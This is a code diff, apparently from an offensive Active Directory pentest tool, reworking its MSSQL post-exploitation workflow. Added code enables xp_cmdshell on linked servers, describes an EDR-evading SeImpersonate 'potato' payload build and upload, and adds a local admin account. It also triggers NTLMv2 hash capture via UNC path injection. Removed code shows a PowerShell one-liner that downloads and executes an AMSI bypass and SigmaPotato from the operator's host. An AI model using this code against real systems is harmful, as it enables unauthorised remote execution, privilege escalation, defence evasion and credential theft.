+        _ls_tree_lines: list[str] = []
+        for _ls_idx, _ls_name in enumerate(linked_names):
+            _ls_connector = "├─" if _ls_idx < len(linked_names) - 1 else "└─"
+            _ls_tree_lines.append(
+                f"  {_ls_connector} {mark_sensitive(_ls_name, 'hostname')}"
             )
+        _ls_tree_body = "\n".join(_ls_tree_lines)
+        print_info(
+            f"[bold]{marked_host}[/bold] has {len(linked_names)} linked server(s):\n"
+            f"{_ls_tree_body}"
+        )
+        for linked in sweep.linked_servers:
+            marked_link = mark_sensitive(linked.name, "hostname")
             print_info(
-                f"Persisted linked-server inventory to {mark_sensitive(persisted_path, 'path')}."
+                f"Attempting linked-server xp_cmdshell enablement on {marked_link}."
             )
-            rendered_servers = ", ".join(
-                str(mark_sensitive(server, "hostname")) for server in linked_servers
-            )
-            print_info(f"Discovered linked SQL servers: {rendered_servers}.")
-        for linked_server in linked_servers:
-            print_info(
-                "Attempting linked-server xp_cmdshell enablement on "
-                f"{mark_sensitive(linked_server, 'hostname')}."
-            )
-            linked_enabled, _linked_result = runner.enable_linked_xp_cmdshell(
-                host,
-                ctx=ctx,
-                username=username,
-                password=password,
-                linked_server=linked_server,
+            link_enable = backend.enable_xp_cmdshell(
                 domain=domain,
-                timeout=120,
+                username=username,
+                secret=password,
+                linked_server=linked.name,
+                timeout=60,
             )
-            if not linked_enabled:
+            if not link_enable.success:
                 print_warning(
                     "Linked-server xp_cmdshell enablement was not confirmed on "
-                    f"{mark_sensitive(linked_server, 'hostname')}."
+                    f"{marked_link}."
                 )
                 continue
             print_success(
-                "xp_cmdshell enabled successfully on linked server "
-                f"{mark_sensitive(linked_server, 'hostname')}."
+                f"xp_cmdshell enabled successfully on linked server {marked_link}."
             )
-            whoami_result = runner.execute_linked_command(
-                host,
-                ctx=ctx,
-                username=username,
-                password=password,
-                linked_server=linked_server,
-                command="whoami",
+            whoami_exec = backend.execute_command(
                 domain=domain,
+                username=username,
+                secret=password,
+                command="whoami",
+                host=host,
+                linked_server=linked.name,
                 timeout=120,
             )
-            if not whoami_result or not parse_link_xpcmd_execution_success(whoami_result.stdout):
+            if not whoami_exec.success or not whoami_exec.stdout_lines:
                 print_warning(
                     "Linked-server command validation did not succeed on "
-                    f"{mark_sensitive(linked_server, 'hostname')}. Trying the next linked server."
+                    f"{marked_link}. Trying the next linked server."
                 )
                 continue
-            identity = parse_link_xpcmd_identity(whoami_result.stdout) or ""
+            identity = whoami_exec.stdout_lines[0].strip()
             print_success(
-                "Linked-server command execution is available via "
-                f"{mark_sensitive(linked_server, 'hostname')}."
+                f"[bold]Execution path confirmed[/bold]: "
+                f"{marked_host} -> {marked_link} "
+                f"as [bold]{mark_sensitive(identity, 'user') if identity else 'unknown'}[/bold]."
             )
             execution_path = MssqlExecutionPath(
                 mode="linked_xpcmd",
-                linked_server=linked_server,
+                linked_server=linked.name,
                 identity=identity or None,
             )
             break
@@ -1415,9 +1529,14 @@ def run_mssql_postauth_workflow(
         }
 
     if execution_path.identity:
+        _mode_label = (
+            "local xp_cmdshell"
+            if execution_path.mode == "xp_cmdshell"
+            else f"linked server ({mark_sensitive(execution_path.linked_server or '', 'hostname')})"
+        )
         print_info(
-            "MSSQL execution identity: "
-            f"{mark_sensitive(execution_path.identity, 'user')}"
+            f"Running as [bold]{mark_sensitive(execution_path.identity, 'user')}[/bold] "
+            f"via {_mode_label}."
         )
 
     if workflow_intent in {"default", "pivot_search", "pivot_relaunch"}:
@@ -1430,9 +1549,7 @@ def run_mssql_postauth_workflow(
             execution_path=execution_path,
             offer_post_pivot_owned_followup=(workflow_intent != "pivot_relaunch"),
         )
-    print_info(
-        "Proceeding with MSSQL filesystem follow-ups after pivot checks."
-    )
+    print_info("Proceeding with MSSQL filesystem follow-ups after pivot checks.")
     mapping_result = _run_mssql_filesystem_mapping(
         shell,
         domain=domain,
@@ -1461,12 +1578,6 @@ def run_mssql_check_impersonate(
     shell: MssqlShell, *, domain: str, host: str, username: str, password: str
 ) -> bool:
     """Check SeImpersonatePrivilege via MSSQL and trigger follow-up prompt."""
-    if not shell.netexec_path:
-        print_error(
-            "NetExec (nxc) path not configured. Please ensure it's installed via 'adscan install'."
-        )
-        return False
-
     marked_host = mark_sensitive(host, "hostname")
     marked_username = mark_sensitive(username, "user")
     print_operation_header(
@@ -1482,14 +1593,30 @@ def run_mssql_check_impersonate(
     print_info(f"Checking SeImpersonate privileges on host {marked_host}")
 
     service = ExploitationService()
-    ctx = _build_mssql_context(shell)
+    posture_snapshot = None
+    posture_sink = None
+    try:
+        from adscan_internal.services.domain_posture import get_posture
+        from adscan_internal.services.posture_sink import (
+            make_workspace_posture_sink,
+        )
+
+        domains_data = getattr(shell, "domains_data", None)
+        if isinstance(domains_data, dict):
+            posture_snapshot = get_posture(domains_data, domain=domain)
+            posture_sink = make_workspace_posture_sink(domains_data)
+    except Exception as posture_exc:
+        telemetry.capture_exception(posture_exc)
+
     result = service.mssql.check_seimpersonate(
         host=host,
         username=username,
         password=password,
         domain=domain,
-        ctx=ctx,
         timeout=60,
+        posture_snapshot=posture_snapshot,
+        posture_sink=posture_sink,
+        domain_for_posture=domain,
     )
 
     try:
@@ -1500,105 +1627,139 @@ def run_mssql_check_impersonate(
         telemetry.capture_exception(e)
 
     if result.has_privilege:
-        print_success(
-            f"User {marked_username} with SeImpersonatePrivilege detected on host {marked_host}"
+        _seimpers_body = RichText.assemble(
+            (
+                "SeImpersonatePrivilege confirmed for ",
+                _COLOR_MUTED,
+            ),
+            (mark_sensitive(username, "user"), f"bold {_COLOR_CRIMSON}"),
+            (" on ", _COLOR_MUTED),
+            (mark_sensitive(host, "hostname"), f"bold {_COLOR_STEEL}"),
+            ("\n\n", ""),
+            ("This account can impersonate SYSTEM via a potato-class exploit.\n", _COLOR_MUTED),
+            ("Next: run the takeover to escalate to SYSTEM-equivalent access.", _COLOR_MUTED),
+        )
+        print_panel(
+            _seimpers_body,
+            title=RichText.assemble(
+                (" SeImpersonatePrivilege ", f"bold black on {_COLOR_CRIMSON}"),
+                ("  local privilege escalation path confirmed", _COLOR_MUTED),
+            ),
+            border_style=_COLOR_CRIMSON,
+            box=_BOX_ROUNDED,
+            padding=(1, 2),
         )
         shell.ask_for_mssql_impersonate(domain, host, username, password)
         return True
 
-    print_warning("SeImpersonatePrivilege not detected.")
+    print_warning(
+        f"SeImpersonatePrivilege not detected on {marked_host} "
+        f"for {marked_username}."
+    )
     return False
 
 
 def run_mssql_impersonate(
     shell: MssqlShell, *, domain: str, host: str, username: str, password: str
 ) -> None:
-    """Exploit SeImpersonate via MSSQL using the legacy SigmaPotato payload flow.
+    """SeImpersonate→SYSTEM via Stealth Payload v3 (adscan_potato).
 
-    This preserves the current behavior:
-    - copies helper payload files into the current directory
-    - base64-encodes a PowerShell one-liner using ps-encoder.py
-    - executes it via NetExec MSSQL xp_cmdshell
+    Delegates to :func:`run_mssql_takeover` — the legacy name is retained
+    so existing call sites in the shell protocol continue to work without
+    change.  New code should call :func:`run_mssql_takeover` directly.
     """
-    if not shell.myip:
-        print_error(
-            "MyIP is not configured; required to host payload files for MSSQL impersonate."
-        )
-        return
-
-    tools_install_dir = os.environ.get("ADSCAN_TOOLS_INSTALL_DIR")
-    if not tools_install_dir:
-        tools_install_dir = str(get_adscan_home() / "tools")
-
-    add_admin_bat = os.path.join(
-        tools_install_dir, "windows-tools", "add_local_admin_user.bat"
+    run_mssql_takeover(
+        shell, domain=domain, host=host, username=username, password=password
     )
-    invoke_sigma = os.path.join(tools_install_dir, "Tools", "Invoke-SigmaPotato.ps1")
-    amsi_txt = os.path.join(tools_install_dir, "Tools", "amsi.txt")
 
-    copy_command = f"cp {add_admin_bat} command.bat && cp {invoke_sigma} test.ps1 && cp {amsi_txt} test.txt"
-    print_info_debug(f"[mssql] Staging payload files: {copy_command}")
-    stage = shell.run_command(copy_command, timeout=60)
-    if not stage or stage.returncode != 0:
-        print_error(
-            "Failed to stage MSSQL payload files (command.bat/test.ps1/test.txt)."
-        )
-        return
 
-    encoded_command = (
-        "ps-encoder.py -e "
-        f'\'$wr = [System.NET.WebRequest]::Create("http://{shell.myip}/test.txt");'
-        "$r = $wr.GetResponse();"
-        "IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd();"
-        f'$wr = [System.NET.WebRequest]::Create("http://{shell.myip}/test.ps1");'
-        "$r = $wr.GetResponse();"
-        "IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd();"
-        f"iwr http://{shell.myip}/command.bat -OutFile C:\\\\Users\\\\Public\\\\Music\\\\command.bat;"
-        "Invoke-SigmaPotato -Command C:\\\\Users\\\\Public\\\\Music\\\\command.bat;"
-        "rm C:\\\\Users\\\\Public\\\\Music\\\\command.bat'"
+def run_mssql_takeover(
+    shell: MssqlShell,
+    *,
+    domain: str,
+    host: str,
+    username: str,
+    password: str,
+    admin_username: str = "test",
+    admin_password: str = "Password123!",
+    revert: bool = False,
+) -> None:
+    """SeImpersonate→SYSTEM via Stealth Payload v3 (``adscan mssql takeover``).
+
+    Replaces the old SigmaPotato/ps-encoder.py flow with the native
+    :class:`SeImpersonateOrchestrator` pipeline:
+
+        1. AV/EDR fingerprint via aiosmb (SMB registry probe + pipe enum).
+        2. Defensive-posture-aware payload selection (OPEN/STANDARD/HARDENED/PARANOID).
+        3. Build: SysWhispers4 stubs → mingw cross-compile → donut wrap → XOR encrypt.
+        4. Upload ``adscan_potato.exe`` in base64 chunks via ``xp_cmdshell``.
+        5. Execute → parse ``ADSCAN_POTATO_SUCCESS`` sentinel.
+        6. Proof collection + outcome card with mandatory revert reminder.
+    """
+    from adscan_internal.services.exploitation.seimpersonate import (
+        SeImpersonateOrchestrator,
     )
-    print_info_debug("[mssql] Encoding PowerShell payload via ps-encoder.py")
-    encoded_proc = shell.run_command(encoded_command, timeout=120)
-    if (
-        not encoded_proc
-        or encoded_proc.returncode != 0
-        or not (encoded_proc.stdout or "").strip()
-    ):
-        print_error("Failed to encode PowerShell payload (ps-encoder.py).")
-        if encoded_proc and encoded_proc.stderr:
-            print_info_debug(encoded_proc.stderr)
-        return
-    encoded_output = (encoded_proc.stdout or "").strip()
+    from adscan_internal.integrations.mssql import ImpacketMSSQLBackend
+    from adscan_internal.services.smb_transport import SMBConfig
 
     marked_host = mark_sensitive(host, "hostname")
-    print_info(f"Adding test user to host {marked_host} via MSSQL")
+    if revert:
+        print_info(f"Reverting takeover on {marked_host}...")
+    else:
+        print_info(f"Starting MSSQL takeover on {marked_host}...")
 
-    service = ExploitationService()
-    ctx = _build_mssql_context(shell)
-    result = service.mssql.execute_encoded_powershell(
-        host=host,
-        username=username,
-        password=password,
-        encoded_command=encoded_output,
-        domain=domain,
-        ctx=ctx,
-        timeout=300,
-    )
-    if not result or not getattr(result, "success", False):
-        print_error("MSSQL impersonate payload execution failed.")
-        return
+    backend = ImpacketMSSQLBackend(host=host)
 
-    stdout = getattr(result, "stdout", "") or ""
-    if "successfully" in stdout.lower():
-        print_success(
-            f"Test user with password Password123! added as local admin on host {marked_host}"
+    # Build an SMB config for the AV/EDR fingerprint (best-effort, informational).
+    smb_config = None
+    try:
+        smb_config = SMBConfig(  # pylint: disable=unexpected-keyword-arg
+            target_ip=host,
+            domain=domain,
+            username=username,
+            password=password if not is_hash_authentication(password) else None,
+            nthash=password if is_hash_authentication(password) else None,
+            use_kerberos=str(password).lower().endswith(".ccache"),
         )
-        shell.ask_for_dump_host(domain, host, "test", "Password123!", "True")
-        return
+    except Exception as exc:  # noqa: BLE001
+        print_info_debug(
+            f"[mssql_takeover] SMB config failed: {exc} — fingerprint skipped"
+        )
 
-    print_warning(
-        "MSSQL impersonate command executed but success marker not found in output."
+    orchestrator = SeImpersonateOrchestrator(shell)
+
+    # Capture starting identity from a quick whoami via xp_cmdshell.
+    target_identity = ""
+    try:
+        id_result = backend.execute_command(
+            domain=domain,
+            username=username,
+            secret=password,
+            command="whoami",
+            host=host,
+            timeout=15,
+        )
+        if id_result.stdout_lines:
+            target_identity = id_result.stdout_lines[0].strip()
+    except Exception:  # noqa: BLE001
+        pass
+
+    outcome = orchestrator.run(
+        mssql_backend=backend,
+        smb_config=smb_config,
+        domain=domain,
+        username=username,
+        secret=password,
+        admin_username=admin_username,
+        admin_password=admin_password,
+        host=host,
+        target_identity=target_identity,
+        revert=revert,
     )
+
+    if outcome.success and not revert:
+        # Surface the standard post-escalation dump prompt.
+        shell.ask_for_dump_host(domain, host, admin_username, admin_password, "True")
 
 
 def ask_for_mssql_access(
@@ -1617,6 +1778,7 @@ def ask_for_mssql_access(
             domain=domain,
             target_host=host,
             workflow_label="MSSQL access workflow",
+            service="mssql",
             resume_after_pivot=True,
         )
         is None
@@ -1644,8 +1806,12 @@ def ask_for_mssql_impersonate(
 ) -> None:
     """Ask user if they want to exploit SeImpersonate on the target host."""
     marked_host = mark_sensitive(host, "hostname")
+    print_warning(
+        "This exploit adds a new local administrator account to the target host. "
+        "Revert after the engagement."
+    )
     if Confirm.ask(
-        f"Do you want to exploit SeImpersonate on {marked_host} (a new local admin user 'test' with password Password123! will be added)?",
+        f"Exploit SeImpersonatePrivilege on {marked_host} and escalate to SYSTEM?",
         default=False,
     ):
         shell.mssql_impersonate(domain, host, username, password)
@@ -1662,8 +1828,32 @@ def ask_for_mssql_steal(
 ) -> None:
     """Ask user if they want to attempt to steal NTLMv2 hash via MSSQL."""
     marked_username = mark_sensitive(username, "user")
+    marked_host_steal = mark_sensitive(host, "hostname")
+    _opsec_body = RichText.assemble(
+        ("OPSEC: ", f"bold {_COLOR_AMBER}"),
+        ("This technique forces the SQL Server service account to authenticate ", _COLOR_MUTED),
+        ("to your listener via UNC path injection (xp_dirtree / xp_fileexist).\n", _COLOR_MUTED),
+        ("It generates the following Windows events on the target:\n", _COLOR_MUTED),
+        ("  4624  Logon (Network, Type 3)\n", f"bold {_COLOR_STEEL}"),
+        ("  4625  Logon failure (if hash is not relayed in time)\n", f"bold {_COLOR_STEEL}"),
+        ("\nCaptures the NTLMv2 challenge-response for ", _COLOR_MUTED),
+        (mark_sensitive(username, "user"), f"bold {_COLOR_STEEL}"),
+        (" on ", _COLOR_MUTED),
+        (marked_host_steal, f"bold {_COLOR_STEEL}"),
+        (".\nEnsure your listener (Responder/ntlmrelayx) is running before confirming.", _COLOR_MUTED),
+    )
+    print_panel(
+        _opsec_body,
+        title=RichText.assemble(
+            (" UNC Path Injection ", f"bold black on {_COLOR_AMBER}"),
+            ("  NTLMv2 capture via MSSQL", _COLOR_MUTED),
+        ),
+        border_style=_COLOR_AMBER,
+        box=_BOX_ROUNDED,
+        padding=(1, 2),
+    )
     if Confirm.ask(
-        f"Do you want to attempt to steal the NTLMv2 hash of the domain user associated with {marked_username} from the database?",
+        f"Trigger NTLMv2 capture for {marked_username} on {marked_host_steal}?",
         default=False,
     ):
         shell.mssql_steal_ntlmv2(domain, host, username, password, islocal)
@@ -1691,7 +1881,10 @@ def run_mssql_steal_ntlmv2(
         f"set smbproxy {shell.myip};"
         f"run;exit'"
     )
-    print_info("Stealing the NTLMv2 hash of the user")
+    print_info(
+        f"Triggering UNC path injection on {marked_host} "
+        f"to capture NTLMv2 hash for {marked_username}."
+    )
     execute_mssql_steal_ntlmv2(shell, command)
 
 
@@ -1748,9 +1941,7 @@ def do_mssql_impersonate(shell: MssqlShell, args: str) -> None:
     """
     args_list = args.split()
     if len(args_list) != 4:
-        print_warning(
-            "Usage: mssql_impersonate <domain> <host> <username> <password>"
-        )
+        print_warning("Usage: mssql_impersonate <domain> <host> <username> <password>")
         return
     domain = args_list[0]
     host = args_list[1]
@@ -1811,7 +2002,11 @@ def execute_mssql_check_impersonate(
                     f"User {marked_username} with SeImpersonatePrivilege detected on host {marked_host}"
                 )
                 ask_for_mssql_impersonate(
-                    shell, domain=domain, host=host, username=username, password=password
+                    shell,
+                    domain=domain,
+                    host=host,
+                    username=username,
+                    password=password,
                 )
             else:
                 print_error("Exploit failed to find SeImpersonatePrivilege.")
